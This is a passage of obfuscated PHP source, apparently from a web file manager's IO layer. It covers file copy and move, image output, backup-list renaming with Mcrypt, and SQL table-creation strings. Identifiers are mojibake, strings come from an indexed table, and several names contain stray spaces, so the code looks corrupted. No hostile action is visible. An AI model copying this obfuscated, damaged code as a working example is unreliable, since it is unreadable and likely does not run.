$ƒÙÏ¾‡Æ[$çíªÌ¦[$îƒ–îüá[57]]] = $â§åôĞ®; } $ßûÁÇ‹¼ = $îƒ–îüá[12]; if ($çíªÌ¦[$îƒ–îüá[56]] !== null) { $¼ÒŸÅÊ¶ = $çíªÌ¦[$îƒ–îüá[56]]; if (in_array($çˆÎ‹½¸, $Îîñóç“) && is_numeric($¼ÒŸÅÊ¶)) { $ßûÁÇ‹¼ = "\104\105\106\101\125\x4c\124\40{$¼ÒŸÅÊ¶}"; } else { if (strtolower($¼ÒŸÅÊ¶) === $îƒ–îüá[103]) { $ßûÁÇ‹¼ = $çíªÌ¦[$îƒ–îüá[35]] ? $îƒ–îüá[12] : $îƒ–îüá[1292]; } else { $Ò…ä£û = is_numeric($¼ÒŸÅÊ¶) ? $¼ÒŸÅÊ¶ : $îƒ–îüá[58] . addslashes($¼ÒŸÅÊ¶) . $îƒ–îüá[58]; $ßûÁÇ‹¼ = "\x44\x45\x46\x41\x55\114\x54\x20{$Ò…ä£û}"; } } } $¡³û¼ó = $çíªÌ¦[$îƒ–îüá[35]] ? $îƒ–îüá[1291] : $îƒ–îüá[1311]; $Ï¨ê¥² = stripos($çˆÎ‹½¸, $îƒ–îüá[364]) !== !1 && $çíªÌ¦[$îƒ–îüá[57]] ? $îƒ–îüá[1312] : $îƒ–îüá[12]; $ó×ËˆÆ[] = sprintf($îƒ–îüá[1313], $â§åôĞ®, $ ÎšÚæ, $¡³û¼ó, $ßûÁÇ‹¼, $Ï¨ê¥²); } if (!empty($ƒÙÏ¾‡Æ)) { ksort($ƒÙÏ¾‡Æ); $—ÍÚÇ‡‚ = $îƒ–îüá[475] . implode($îƒ–îüá[1233], $ƒÙÏ¾‡Æ) . $îƒ–îüá[475]; $ó×ËˆÆ[] = "\x50\x52\x49\x4d\101\122\x59\40\113\105\x59\40\x28{$—ÍÚÇ‡‚}\x29"; } foreach ($ùï×¼Öâ as $æ“ü¶¿) { if ($æ“ü¶¿[$îƒ–îüá[1303]]) { continue; } $¸ÊÉá = array(); foreach ($æ“ü¶¿[$îƒ–îüá[1304]] as $Í¬Í÷×î) { $—· û§… = null; foreach ($öÂ»‹æÑ as $§Úú³ÌŒ) { if ($§Úú³ÌŒ[$îƒ–îüá[32]] == $Í¬Í÷×î) { $—· û§… = strtolower($§Úú³ÌŒ[$îƒ–îüá[33]]); break; } } if ($—· û§… == $îƒ–îüá[1280] && in_array($Í¬Í÷×î, $ú±ğîÊ)) { $¸ÊÉá[] = "\x60{$Í¬Í÷×î}\140\50\62\65\60\51"; } else { $¸ÊÉá[] = "\140{$Í¬Í÷×î}\140"; } } $çˆÎ‹½¸ = ($æ“ü¶¿[$îƒ–îüá[1302]] ? $îƒ–îüá[1314] : $îƒ–îüá[12]) . $îƒ–îüá[1315]; $ğÂé„¨ = str_replace($îƒ–îüá[1268] . $ÚŸ…üß . $îƒ–îüá[11], $îƒ–îüá[12], $æ“ü¶¿[$îƒ–îüá[32]]); $ğÂé„¨ = str_replace($ÚŸ…üß . $îƒ–îüá[11], $îƒ–îüá[12], $ğÂé„¨); $ó×ËˆÆ[] = "{$çˆÎ‹½¸}\40\140{$ğÂé„¨}\140\40\x28" . implode($îƒ–îüá[50], $¸ÊÉá) . $îƒ–îüá[1232]; } $·¸³µ» = array("\104\x52\x4f\x50\x20\x54\x41\102\114\x45\x20\x49\x46\40\x45\x58\x49\123\124\x53\x20{$Â¾à¹¤ê}\x3b", "\x43\x52\105\101\x54\105\40\x54\101\x42\114\x45\x20{$Â¾à¹¤ê}\x20\50", implode($îƒ–îüá[50] . PHP_EOL, $ó×ËˆÆ), $îƒ–îüá[1316]); $·¸³µ» = implode(PHP_EOL, $·¸³µ»); if ($ ÎšÚæ == $îƒ–îüá[892]) { return $·¸³µ»; } $ãÆ‡’ôâ[$îƒ–îüá[892]] = $·¸³µ»; return $ãÆ‡’ôâ; } private function escapeName($ò˜ò¨‡ù, $¶ş‚Îá’ = "\155\x79\163\161\x6c") { $—ÓÊİÖ¦ =& $_SERVER[¹Éµ„ºå]; $ò˜ò¨‡ù = preg_replace($—ÓÊİÖ¦[1317], $—ÓÊİÖ¦[12], $ò˜ò¨‡ù); if ($¶ş‚Îá’ === $—ÓÊİÖ¦[892]) { return "\x60{$ò˜ò¨‡ù}\140"; } return "\x22{$ò˜ò¨‡ù}\x22"; } public function mixBakList($Î†ÒË‘) { $ÂôĞ»©¤ =& $_SERVER[¹Éµ„ºå]; $Î†ÒË‘ = rtrim($Î†ÒË‘, $ÂôĞ»©¤[8]) . $ÂôĞ»©¤[8]; $Õ‘Û¹™„ = $ÂôĞ»©¤[1318]; $ˆù‰¹Ô = IO::listPath($Î†ÒË‘); if (empty($ˆù‰¹Ô[$ÂôĞ»©¤[86]])) { return !1; } $×ßËŸ£˜ = array(); foreach ($ˆù‰¹Ô[$ÂôĞ»©¤[86]] as $¤îŸÌæŒ => $‚Øˆ¡§) { if (!$‚Øˆ¡§[$ÂôĞ»©¤[32]] || !$‚Øˆ¡§[$ÂôĞ»©¤[87]]) { continue; } $Á•Ñ¸ˆ” = Mcrypt::encode($‚Øˆ¡§[$ÂôĞ»©¤[32]], $Õ‘Û¹™„); $‚Ÿ“œåı = md5($Á•Ñ¸ˆ”); IO::rename($‚Øˆ¡§[$ÂôĞ»©¤[87]], $‚Ÿ“œåı); $×ßËŸ£˜[$‚Ÿ“œåı] = $Á•Ñ¸ˆ”; } $…ëñÙ‰Ç = md5($ÂôĞ»©¤[1319] . $Õ‘Û¹™„); IO::setContent($Î†ÒË‘ . $…ëñÙ‰Ç, json_encode($×ßËŸ£˜)); return !0; } public function unmixBakList($î·º×”ù) { $˜Éù¦àà =& $_SERVER[¹Éµ„ºå]; $î·º×”ù = rtrim($î·º×”ù, $˜Éù¦àà[8]) . $˜Éù¦àà[8]; $Å½•â®‹ = $this->unmixBakListGet($î·º×”ù, !0); if (empty($Å½•â®‹)) { return !1; } foreach ($Å½•â®‹ as $Ç—ô¹¹ => $Áù¦ŞÔÎ) { $Ÿş’şêô = IO::rename($î·º×”ù . $Áù¦ŞÔÎ, $Ç—ô¹¹); if (!$Ÿş’şêô) { return !1; } } return !0; } public function unmixBakListGet($²Ù‚ÖÌä, $•õ÷™Õ = false) { $ìèËìéÛ =& $_SERVER[¹Éµ„ºå]; $²Ù‚ÖÌä = rtrim($²Ù‚ÖÌä, $ìèËìéÛ[8]) . $ìèËìéÛ[8]; $åˆëâ·¥ = $ìèËìéÛ[1318]; $åÕ¦¥ = md5($ìèËìéÛ[1319] . $åˆëâ·¥); $µö°š– = $²Ù‚ÖÌä . $åÕ¦¥; if (!IO::exist($µö°š–)) { return !1; } $î£ô›×Æ = json_decode(IO::getContent($µö°š–), !0); if (empty($î£ô›×Æ)) { return !1; } $ñÕœÆ´› = array(); foreach ($î£ô›×Æ as $­…ìø‰º => $×ÔöÃ¸Ï) { $åÕ¦¥ = Mcrypt::decode($×ÔöÃ¸Ï, $åˆëâ·¥); $ñÕœÆ´›[$åÕ¦¥] = $­…ìø‰º; } if ($•õ÷™Õ) { IO::remove($µö°š–, !1); } return $ñÕœÆ´›; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÌşóÛ€, $À”şŠ£¾) { $¾‘¯ü£ =& $_SERVER[¹Éµ„ºå]; $Ğ¼ºæ¢µ = $À”şŠ£¾; $GLOBALS[$¾‘¯ü£[1320]] = $¾‘¯ü£[1321] . $ÌşóÛ€; Hook::trigger($¾‘¯ü£[1321] . $ÌşóÛ€ . $¾‘¯ü£[1322], $Ğ¼ºæ¢µ); $ô÷ğÂÉû = self::driverMake($À”şŠ£¾[0]); if (!$ô÷ğÂÉû) { return !1; } if ($ÌşóÛ€ == $¾‘¯ü£[641] || $ÌşóÛ€ == $¾‘¯ü£[643] || $ÌşóÛ€ == $¾‘¯ü£[1323]) { if (!trim($ô÷ğÂÉû->path . $¾‘¯ü£[463], $¾‘¯ü£[8])) { return !1; } } if (method_exists($ô÷ğÂÉû, $ÌşóÛ€)) { $‰††ûîò = @call_user_func_array(array($ô÷ğÂÉû, $ÌşóÛ€), $À”şŠ£¾); } else { if (method_exists($ô÷ğÂÉû, $¾‘¯ü£[1324])) { $‰††ûîò = @call_user_func_array(array($ô÷ğÂÉû, $ÌşóÛ€), $À”şŠ£¾); } else { if (method_exists(self, $ÌşóÛ€)) { $‰††ûîò = @call_user_func_array(array(self, $ÌşóÛ€), $À”şŠ£¾); } else { $‰††ûîò = call_user_func_array(array(parent, $ÌşóÛ€), $À”şŠ£¾); } } } Hook::trigger($¾‘¯ü£[1321] . $ÌşóÛ€ . $¾‘¯ü£[1325], $Ğ¼ºæ¢µ, $‰††ûîò); return $‰††ûîò; } public static function init($óÖ‹ÜÀ) { return self::driverMake($óÖ‹ÜÀ); } public static function copy($ª³¾å, $Ú”¹°ˆ, $¡ì“ÅèÇ = false, $¥½á±‡‡ = false) { return self::copyMoveStart($ª³¾å, $Ú”¹°ˆ, $¡ì“ÅèÇ, $_SERVER[¹Éµ„ºå][641], $¥½á±‡‡); } public static function move($Ó±Ñ€Áš, $ˆìÜè¿, $şíÚĞ¯ = false, $İì®Ÿã = false) { return self::copyMoveStart($Ó±Ñ€Áš, $ˆìÜè¿, $şíÚĞ¯, $_SERVER[¹Éµ„ºå][643], $İì®Ÿã); } public static function copyMoveChildren($ ¾ã·ğ‚, $¿ÓÍú´ö, $„”Šà¨œ = "\x63\x6f\160\x79", $Ë·²±¤› = REPEAT_REPLACE) { $œ‘îµÑ =& $_SERVER[¹Éµ„ºå]; $ñŞÉ±‡¨ = $ ¾ã·ğ‚; $Ôæ¥Ü£Ê = self::driverMake($ ¾ã·ğ‚); $˜»‹ÜûÀ = $Ôæ¥Ü£Ê->listPath($ ¾ã·ğ‚, !0); $Ù¨È§êÏ = array_merge($˜»‹ÜûÀ[$œ‘îµÑ[86]], $˜»‹ÜûÀ[$œ‘îµÑ[85]]); foreach ($Ù¨È§êÏ as $æË§ãñ) { self::copyMoveStart($æË§ãñ[$œ‘îµÑ[87]], $¿ÓÍú´ö, $Ë·²±¤›, $„”Šà¨œ, !1); } if ($„”Šà¨œ == $œ‘îµÑ[643]) { self::remove($ñŞÉ±‡¨); } } private static function copyMoveStart($·İìÙ‚ã, $óË“‰şı, $¤«’á‚ó, $…‘³…·ö, $¨çŠ©Ñ) { $œÄïÙ›å =& $_SERVER[¹Éµ„ºå]; $¾‚ÑËù• = array($·İìÙ‚ã, $óË“‰şı, $¤«’á‚ó, $¨çŠ©Ñ); Hook::trigger($œÄïÙ›å[1321] . $…‘³…·ö . $œÄïÙ›å[1322], $¾‚ÑËù•); $¾™şÇõ = self::copyMove($·İìÙ‚ã, $óË“‰şı, $¤«’á‚ó, $…‘³…·ö, $¨çŠ©Ñ); Hook::trigger($œÄïÙ›å[1321] . $…‘³…·ö . $œÄïÙ›å[1325], $¾‚ÑËù•, $¾™şÇõ); return $¾™şÇõ; } public static function saveFile($Ûö·«òæ, $°Óâ©åğ, $©Ãûì…ı = true) { $ˆ½­°’º =& $_SERVER[¹Éµ„ºå]; $¿äÓ¿²¯ = self::info($°Óâ©åğ); $ã¼÷âÄª = self::driverMake($Ûö·«òæ); $¢ª êø› = self::driverMake($°Óâ©åğ); $Ğµ¶êÅ = !1; if ($¢ª êø›->pathParse[$ˆ½­°’º[1326]]) { $Ğµ¶êÅ = $¢ª êø›; $¤“„Õ— = $¢ª êø›->pathParse[$ˆ½­°’º[1326]]; $¢ª êø› = self::driverMake($¤“„Õ—); } if ($ã¼÷âÄª->pathParse[$ˆ½­°’º[1326]]) { $¹¡éŞµ = $ã¼÷âÄª->pathParse[$ˆ½­°’º[1326]]; $ã¼÷âÄª = self::driverMake($¹¡éŞµ); } $™§ø£š = $¢ª êø›->pathFather($°Óâ©åğ); $×—–œí = !0; if (!$©Ãûì…ı && self::driverIsSame($ã¼÷âÄª, $¢ª êø›)) { $×—–œí = !1; } $¤ÔˆÄìÏ = self::copyFile($ã¼÷âÄª, $Ûö·«òæ, $¢ª êø›, $™§ø£š, $¿äÓ¿²¯[$ˆ½­°’º[32]], $×—–œí); if ($Ğµ¶êÅ) { $¤ÔˆÄìÏ = $Ğµ¶êÅ->getPathOuter($¤ÔˆÄìÏ); } return $¤ÔˆÄìÏ; } private static function copyMove($ßŠışÑ—, $ÌÖœºŞÖ, $‡ñ‹×¨½, $©âı»ï™, $³úÜ©§£ = false) { $Œ‘”§—Í =& $_SERVER[¹Éµ„ºå]; if (!$ßŠışÑ— || $ßŠışÑ— == $Œ‘”§—Í[8] || !$ÌÖœºŞÖ) { return !1; } ignore_timeout(); $¤Š®’ = self::driverMake($ßŠışÑ—); $¼ŒÁğï = self::driverMake($ÌÖœºŞÖ); $ı€¤‚ã = $©âı»ï™ == $Œ‘”§—Í[643]; $†¦º»½ = !1; if ($¼ŒÁğï->pathParse[$Œ‘”§—Í[1326]]) { $†¦º»½ = $¼ŒÁğï; $ÌÖœºŞÖ = $¼ŒÁğï->pathParse[$Œ‘”§—Í[1326]]; $¼ŒÁğï = self::driverMake($ÌÖœºŞÖ); } if ($¤Š®’->pathParse[$Œ‘”§—Í[1326]]) { $ßŠışÑ— = $¤Š®’->pathParse[$Œ‘”§—Í[1326]]; $¤Š®’ = self::driverMake($ßŠışÑ—); } self::check($¤Š®’, $ßŠışÑ—, $¼ŒÁğï, $ÌÖœºŞÖ); Hook::trigger($Œ‘”§—Í[1327], $¤Š®’, $ßŠışÑ—, $¼ŒÁğï, $ÌÖœºŞÖ); $‰çÕ‹° = self::driverIsSame($¤Š®’, $¼ŒÁğï); if ($‰çÕ‹°) { if ($©âı»ï™ == $Œ‘”§—Í[643] && !method_exists($¼ŒÁğï, $Œ‘”§—Í[1328]) && trim($ÌÖœºŞÖ, $Œ‘”§—Í[8]) == trim($¼ŒÁğï->pathFather($ßŠışÑ—), $Œ‘”§—Í[8])) { if ($¤Š®’->pathThis($ßŠışÑ—) != $³úÜ©§£ && !$¤Š®’->isOsDriver()) { return $¤Š®’->rename($ßŠışÑ—, $³úÜ©§£); } return $¼ŒÁğï->getPathOuter($ßŠışÑ—); } if (method_exists($¼ŒÁğï, $©âı»ï™)) { return $¼ŒÁğï->{$©âı»ï™}($ßŠışÑ—, $ÌÖœºŞÖ, $‡ñ‹×¨½, $³úÜ©§£); } } if ($‰çÕ‹° && $©âı»ï™ == $Œ‘”§—Í[643] && $¼ŒÁğï->getType() == $Œ‘”§—Í[106]) { $¹Ö˜Ú€Å = $¼ŒÁğï->movePath($ßŠışÑ—, $ÌÖœºŞÖ, $³úÜ©§£); if ($¹Ö˜Ú€Å) { return $¹Ö˜Ú€Å; } } $˜õ‹„àÚ = $¤Š®’->isFile($ßŠışÑ—); if (!$˜õ‹„àÚ && $¼ŒÁğï->getType() == $Œ‘”§—Í[849] && $¤Š®’->getType() == $Œ‘”§—Í[106]) { $¹Ö˜Ú€Å = $¼ŒÁğï->copyFolderFromIO($¤Š®’, $ßŠışÑ—, $ÌÖœºŞÖ, $‡ñ‹×¨½, $ı€¤‚ã, $³úÜ©§£); } else { $¹Ö˜Ú€Å = self::copyPath($¤Š®’, $ßŠışÑ—, $¼ŒÁğï, $ÌÖœºŞÖ, $‡ñ‹×¨½, $ı€¤‚ã, $˜õ‹„àÚ, $³úÜ©§£); } if ($¹Ö˜Ú€Å && $ı€¤‚ã) { $¤Š®’->remove($ßŠışÑ—); } if ($†¦º»½) { $¹Ö˜Ú€Å = $†¦º»½->getPathOuter($¹Ö˜Ú€Å); } return $¹Ö˜Ú€Å; } private static function check($÷Ÿ±õİ¡, $ÌË‡àØš, $ç¿×ê™­, &$ÛÕÍÍ»Â) { $íäÒ­ç³ =& $_SERVER[¹Éµ„ºå]; if (self::driverIsSame($÷Ÿ±õİ¡, $ç¿×ê™­) && $÷Ÿ±õİ¡->isFolder($ÌË‡àØš) && $÷Ÿ±õİ¡->isParentOf($ÌË‡àØš, $ÛÕÍÍ»Â)) { show_json(LNG($íäÒ­ç³[1329]), !1); } if (!$÷Ÿ±õİ¡->exist($ÌË‡àØš)) { show_json(LNG($íäÒ­ç³[105]), !1); } } private static function copyPath($ú“µ©, $ĞÂ”ï¶…, $ùù¢“ìƒ, $÷‘ôŠ÷¸, $ÚÄ÷ƒö„, $Îƒ¬½–È, $å•áÔæ, $ƒø„¥ˆû = false, $Œµ’®Š = true) { $‘¡÷¾ =& $_SERVER[¹Éµ„ºå]; $ˆÙı©ê‹ = empty($ƒø„¥ˆû) && $ƒø„¥ˆû !== $‘¡÷¾[228] ? $ú“µ©->pathThis($ĞÂ”ï¶…) : $ƒø„¥ˆû; if ($ÚÄ÷ƒö„) { $çÃ¬ÂÙ¾ = $ùù¢“ìƒ->fileNameExist($÷‘ôŠ÷¸, $ˆÙı©ê‹); $ë­éÒÇ = $ˆÙı©ê‹; $ˆÙı©ê‹ = $ùù¢“ìƒ->fileNameAuto($÷‘ôŠ÷¸, $ˆÙı©ê‹, $ÚÄ÷ƒö„, !$å•áÔæ); if (!$çÃ¬ÂÙ¾ || $ë­éÒÇ != $ˆÙı©ê‹) { $ÚÄ÷ƒö„ = !1; } if ($Œµ’®Š && !$ÚÄ÷ƒö„) { $ùù¢“ìƒ->_data[$‘¡÷¾[1330]] = !0; } } if ($å•áÔæ) { return self::copyFile($ú“µ©, $ĞÂ”ï¶…, $ùù¢“ìƒ, $÷‘ôŠ÷¸, $ˆÙı©ê‹, $Îƒ¬½–È); } if ($ÚÄ÷ƒö„ == REPEAT_RENAME_FOLDER) { $ÚÄ÷ƒö„ = !1; } $•àí¹å· = rtrim($÷‘ôŠ÷¸, $‘¡÷¾[8]) . $‘¡÷¾[8] . $ˆÙı©ê‹; $ò‚ØÜ² = $ùù¢“ìƒ->mkdir($ùù¢“ìƒ->getPath($•àí¹å·), $ÚÄ÷ƒö„); $÷‘ôŠ÷¸ = $ùù¢“ìƒ->getPathInner($ò‚ØÜ²); $äÁ¯şı‚ = $ú“µ©->listPath($ĞÂ”ï¶…, !0); $äÁ¯şı‚ = is_array($äÁ¯şı‚) ? $äÁ¯şı‚ : array($‘¡÷¾[86] => array(), $‘¡÷¾[85] => array()); $©³şÅ‡Ÿ = array_merge($äÁ¯şı‚[$‘¡÷¾[86]], $äÁ¯şı‚[$‘¡÷¾[85]]); foreach ($©³şÅ‡Ÿ as $óËîœØİ) { $³î‡¢„ = $óËîœØİ[$‘¡÷¾[33]] == $‘¡÷¾[230]; $ĞÂ”ï¶… = $ú“µ©->getPathInner($óËîœØİ[$‘¡÷¾[87]]); $ŠÆÒ¶ˆ¨ = self::copyPath($ú“µ©, $ĞÂ”ï¶…, $ùù¢“ìƒ, $÷‘ôŠ÷¸, $ÚÄ÷ƒö„, $Îƒ¬½–È, $³î‡¢„, !1, !1); if (!$ŠÆÒ¶ˆ¨) { IO::errorTips($‘¡÷¾[1331] . $ĞÂ”ï¶… . $‘¡÷¾[73] . $÷‘ôŠ÷¸); } } self::copyMoveKeepInfo($ú“µ©, $ĞÂ”ï¶…, $ò‚ØÜ²); return $ò‚ØÜ²; } private static function copyFile($ò–„¨‰±, $ã­¨Œ‹¿, $Ã¦½İ¿, $Üìë‚™ı, $ä£°ÔÍ½, $ï‰¯Û¼) { $¨µŸ¤¥Ò =& $_SERVER[¹Éµ„ºå]; $Üìë‚™ı = $Ã¦½İ¿->getPath(rtrim($Üìë‚™ı, $¨µŸ¤¥Ò[8]) . $¨µŸ¤¥Ò[8] . $ä£°ÔÍ½); $€±ÒÀ’æ = $¨µŸ¤¥Ò[1332] . time() . rand_string(5); Hook::trigger($¨µŸ¤¥Ò[1333], $ò–„¨‰±, $ã­¨Œ‹¿, $Ã¦½İ¿, $Üìë‚™ı, $ä£°ÔÍ½, $€±ÒÀ’æ); if (self::driverIsSame($ò–„¨‰±, $Ã¦½İ¿)) { if ($ï‰¯Û¼) { $öã¶¼È¤ = $Ã¦½İ¿->moveFile($ã­¨Œ‹¿, $Üìë‚™ı); } else { $öã¶¼È¤ = $Ã¦½İ¿->copyFile($ã­¨Œ‹¿, $Üìë‚™ı); } Hook::trigger($¨µŸ¤¥Ò[1334], $ò–„¨‰±, $ã­¨Œ‹¿, $Ã¦½İ¿, $Üìë‚™ı, $ä£°ÔÍ½, $öã¶¼È¤); self::copyMoveKeepInfo($ò–„¨‰±, $ã­¨Œ‹¿, $öã¶¼È¤); return $öã¶¼È¤; } $ˆª‚Í å = TEMP_FILES; if ($GLOBALS[$¨µŸ¤¥Ò[6]][$¨µŸ¤¥Ò[92]][$¨µŸ¤¥Ò[889]]) { $ˆª‚Í å = $GLOBALS[$¨µŸ¤¥Ò[6]][$¨µŸ¤¥Ò[92]][$¨µŸ¤¥Ò[889]]; } $Ó‹Å¿½Ò = $ˆª‚Í å; mk_dir($Ó‹Å¿½Ò); $î«ÎğÆ‡ = $Ó‹Å¿½Ò . $€±ÒÀ’æ; $ÉÂİøÌñ = $î«ÎğÆ‡; $î«ÎğÆ‡ = $ò–„¨‰±->download($ã­¨Œ‹¿, $î«ÎğÆ‡); $î«ÎğÆ‡ = $ò–„¨‰±->iconvApp($î«ÎğÆ‡); if (substr($î«ÎğÆ‡, strlen($ˆª‚Í å)) == $ˆª‚Í å) { $ï‰¯Û¼ = !0; } $öã¶¼È¤ = $Ã¦½İ¿->upload($Üìë‚™ı, $î«ÎğÆ‡, $ï‰¯Û¼); self::remove($ÉÂİøÌñ); Hook::trigger($¨µŸ¤¥Ò[1334], $ò–„¨‰±, $ã­¨Œ‹¿, $Ã¦½İ¿, $Üìë‚™ı, $ä£°ÔÍ½, $öã¶¼È¤); self::copyMoveKeepInfo($ò–„¨‰±, $ã­¨Œ‹¿, $öã¶¼È¤); return $öã¶¼È¤; } private static function copyMoveKeepInfo($Å„§Şæğ, $•ÃÓõ†ç, $íàË¬ƒ) { if (!$íàË¬ƒ) { return; } $¤íæÂÚ = $Å„§Şæğ->info($•ÃÓõ†ç); if (!is_array($¤íæÂÚ)) { return; } IO::setModifyTime($íàË¬ƒ, $¤íæÂÚ[$_SERVER[¹Éµ„ºå][88]]); } public static function pathFather($Ã‹›şƒ) { $İµ•éÆá = IO::init($Ã‹›şƒ); $“ß­•Ÿ = $İµ•éÆá->pathFather($İµ•éÆá->path); return $İµ•éÆá->getPathOuter($“ß­•Ÿ); } public static function fileOut($ø¬Şû´–, $ÇØÖìÔ = false, $óë§œß = false, $÷¯°ïç = '') { $äÎØà = self::driverMake($ø¬Şû´–); if ($äÎØà->isFileOutServer()) { return $äÎØà->fileOutServer($ø¬Şû´–, $ÇØÖìÔ, $óë§œß, $÷¯°ïç); } return $äÎØà->fileOut($ø¬Şû´–, $ÇØÖìÔ, $óë§œß, $÷¯°ïç); } public static function fileOutImage($„ğ¡Š¦‹, $–Äˆ¬ªå = 250) { $ùäåÀ— = array(250, 600, 1200, 2000, 3000, 5000); for ($¤§·ùä÷ = 0; $¤§·ùä÷ < count($ùäåÀ—); $¤§·ùä÷++) { if ($¤§·ùä÷ == 0 && $–Äˆ¬ªå <= $ùäåÀ—[$¤§·ùä÷]) { $–Äˆ¬ªå = $ùäåÀ—[$¤§·ùä÷]; break; } else { if ($–Äˆ¬ªå > $ùäåÀ—[$¤§·ùä÷ - 1] && $–Äˆ¬ªå <= $ùäåÀ—[$¤§·ùä÷]) { $–Äˆ¬ªå = $ùäåÀ—[$¤§·ùä÷]; break; } else { if ($¤§·ùä÷ == count($ùäåÀ—) - 1 && $–Äˆ¬ªå > $ùäåÀ—[$¤§·ùä÷]) { $–Äˆ¬ªå = $ùäåÀ—[$¤§·ùä÷]; break; } } } } $ªºœ”Ï = self::driverMake($„ğ¡Š¦‹); if ($ªºœ”Ï->isFileOutServer()) { return $ªºœ”Ï->fileOutImageServer($„ğ¡Š¦‹, $–Äˆ¬ªå); } return $ªºœ”Ï->fileOutImage($„ğ¡Š¦‹, $–Äˆ¬ªå); } private static function driverIsSame($’…Ãï˜Å, $êºé¥ç·) { $ÍçÒëÂâ =& $_SERVER[¹Éµ„ºå]; $Êßå©Å• = $’…Ãï˜Å->getType(); $³˜™†Ï = $êºé¥ç·->getType(); if ($Êßå©Å• != $³˜™†Ï) { return !1; } if ($Êßå©Å• == $ÍçÒëÂâ[849]) { return !0; } if ($Êßå©Å• == $ÍçÒëÂâ[106]) { return !0; } if ($’…Ãï˜Å->pathDriver == $êºé¥ç·->pathDriver) { return !0; } return !1; } public static function copyUpdate($‘·’Ùİ“, $Šàì˜¬â) { $îÌÖŞ— =& $_SERVER[¹Éµ„ºå]; if (!IO::exist($‘·’Ùİ“)) { return !1; } if (!IO::exist($Šàì˜¬â)) { IO::mkdir($Šàì˜¬â); } $¶Ñ±†ˆ = array_to_keyvalue(self::listAllSimple($‘·’Ùİ“), $îÌÖŞ—[87]); $ÑŞ™…Ê = array_to_keyvalue(self::listAllSimple($Šàì˜¬â), $îÌÖŞ—[87]); $¯•î§ÖÇ = array(); $ôùÙÍ  = array(); foreach ($¶Ñ±†ˆ as $­—í’õ => $±å–Ó¨›) { if (isset($ÑŞ™…Ê[$­—í’õ])) { if ($±å–Ó¨›[$îÌÖŞ—[78]] == 1) { continue; } if ($ÑŞ™…Ê[$­—í’õ][$îÌÖŞ—[79]] == $±å–Ó¨›[$îÌÖŞ—[79]]) { continue; } } if ($±å–Ó¨›[$îÌÖŞ—[78]] == 1) { $ôùÙÍ [] = $Šàì˜¬â . $îÌÖŞ—[8] . trim($­—í’õ, $îÌÖŞ—[8]); continue; } $ú„ñ¾ø = strstr(trim($­—í’õ, $îÌÖŞ—[8]), $îÌÖŞ—[8]) ? get_path_father($­—í’õ) : $îÌÖŞ—[12]; $¯•î§ÖÇ[] = array($îÌÖŞ—[1335] => $±å–Ó¨›[$îÌÖŞ—[89]], $îÌÖŞ—[1336] => rtrim($Šàì˜¬â, $îÌÖŞ—[8]) . $îÌÖŞ—[8] . $ú„ñ¾ø, $îÌÖŞ—[1337] => $±å–Ó¨›); } $»µ…²Ãı = array($îÌÖŞ—[230] => $¯•î§ÖÇ, $îÌÖŞ—[78] => $ôùÙÍ ); Hook::trigger($îÌÖŞ—[1338], $‘·’Ùİ“, $Šàì˜¬â, $»µ…²Ãı); foreach ($ôùÙÍ  as $±å–Ó¨›) { IO::mkdir($±å–Ó¨›); } foreach ($¯•î§ÖÇ as $±å–Ó¨›) { IO::copy($±å–Ó¨›[$îÌÖŞ—[1335]], $±å–Ó¨›[$îÌÖŞ—[1336]], REPEAT_REPLACE); } } public static function fileSubstr($Ä‹‘æ‰Ë, $ïŒø–æ, $à†ıõßü = false) { $Ğ”·œæØ =& $_SERVER[¹Éµ„ºå]; $´©Å—Ê = self::driverMake($Ä‹‘æ‰Ë); $“¥©ŞšÛ = $´©Å—Ê->size($Ä‹‘æ‰Ë); $Œ™«×¬ = $ïŒø–æ; $Óñ¾áíâ = $à†ıõßü; if ($ïŒø–æ < 0) { $ïŒø–æ = $“¥©ŞšÛ + $ïŒø–æ; } if ($à†ıõßü === !1) { $à†ıõßü = $“¥©ŞšÛ - $ïŒø–æ; } if ($ïŒø–æ + $à†ıõßü > $“¥©ŞšÛ) { $à†ıõßü = $“¥©ŞšÛ - $ïŒø–æ; } if (!$“¥©ŞšÛ && $´©Å—Ê->getType() == $Ğ”·œæØ[106] && !$´©Å—Ê->exist($Ä‹‘æ‰Ë)) { $ŠşÈâÃÁ = get_path_this($Ä‹‘æ‰Ë); $çÕ‰è¯ = parse_url_query($ŠşÈâÃÁ); if (is_array($çÕ‰è¯) && isset($çÕ‰è¯[$Ğ”·œæØ[32]])) { $ŠşÈâÃÁ = urldecode($çÕ‰è¯[$Ğ”·œæØ[32]]); } throw new Exception($Ğ”·œæØ[1339] . LNG($Ğ”·œæØ[1340]) . $Ğ”·œæØ[1123] . clear_html($ŠşÈâÃÁ) . $Ğ”·œæØ[12]); } if ($à†ıõßü <= 0) { return $Ğ”·œæØ[12]; } if ($ïŒø–æ < 0 || $ïŒø–æ >= $“¥©ŞšÛ || $à†ıõßü > $GLOBALS[$Ğ”·œæØ[6]][$Ğ”·œæØ[92]][$Ğ”·œæØ[1341]]) { throw new Exception("\x66\x69\x6c\x65\122\x65\x61\x64\x20\x65\162\x72\x6f\x72\54\157\x76\x65\162\40\151\x6f\x52\x65\x61\144\115\x61\x78\x21\40\x73\x74\x61\162\164\x3d{$ïŒø–æ}\73\x6c\145\156\147\x74\x68\75{$à†ıõßü}\x3b\x20\x73\151\172\145\x3d{$“¥©ŞšÛ}\73"); } $ö¨³Ü»¸ = $´©Å—Ê->fileSubstr($Ä‹‘æ‰Ë, $ïŒø–æ, $à†ıõßü); if (!$ö¨³Ü»¸ && $à†ıõßü && isset($GLOBALS[$Ğ”·œæØ[1342]])) { throw new Exception($GLOBALS[$Ğ”·œæØ[1342]][$Ğ”·œæØ[1343]]); } return $ö¨³Ü»¸; } private static function driverMake(&$İşèÔ«ı) { $ø¹ñëÕ› =& $_SERVER[¹Éµ„ºå]; $á÷î’¯˜ = KodIO::parse($İşèÔ«ı); if (!self::$driverListSystem) { $€õÑÙ¶“ = Model($ø¹ñëÕ›[859])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($€õÑÙ¶“, $ø¹ñëÕ›[487]); } if ($á÷î’¯˜[$ø¹ñëÕ›[33]] == KodIO::KOD_IO && !self::$driverListSystem[$á÷î’¯˜[$ø¹ñëÕ›[487]]]) { throw new Exception($ø¹ñëÕ›[1344]); return !1; } $İşèÔ«ı = $á÷î’¯˜[$ø¹ñëÕ›[1345]]; $×üªÄÉ¯ = self::driverGet($á÷î’¯˜, $İşèÔ«ı); return $×üªÄÉ¯; } private static function 